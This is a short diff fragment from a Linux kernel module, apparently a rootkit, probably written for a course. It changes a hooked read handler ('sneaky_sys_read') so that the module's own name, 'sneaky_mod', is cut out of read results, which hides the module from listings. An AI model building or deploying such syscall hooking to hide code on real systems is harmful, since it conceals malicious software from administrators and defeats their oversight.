@@ -102,7 +102,7 @@ asmlinkage ssize_t sneaky_sys_read(struct pt_regs *regs) {
     if (nread == 0) {
         return 0;
     }
-    find = strnstr(buf, "sneaky_process", strlen("sneaky_process"));
+    find = strnstr(buf, "sneaky_mod", strlen("sneaky_mod"));
     if (find != NULL) {
         end = strnstr(find, "\n", strlen("\n"));
         if (end != NULL) {
